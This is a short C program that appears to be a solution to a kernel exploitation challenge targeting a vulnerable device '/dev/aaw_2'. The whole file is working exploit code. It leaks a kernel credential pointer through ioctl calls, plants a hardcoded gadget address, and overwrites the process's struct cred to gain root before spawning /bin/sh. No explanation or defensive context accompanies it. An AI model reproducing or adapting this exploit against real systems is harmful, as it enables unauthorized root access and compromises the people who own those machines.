// gcc -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>

#define SET 0x11
#define CRED 0x22

int main() {
    int fd;
    void *gadget;
    void *cred;
    
    fd = open("/dev/aaw_2", O_RDWR);

    /* step 1 - leak cred */
    ioctl(fd, CRED, &cred);

    /* step 2 - set victim var */
    gadget = 0xffffffff810e3189;    // mov dword ptr [rdx], esi; ret
    ioctl(fd, SET, &gadget);

    /* step 3 - overwrite struct cred */
    for(int i=1; i<11; i++)
        ioctl(fd, NULL, cred + (4*i));
    
    system("/bin/sh");

    return 0;
}
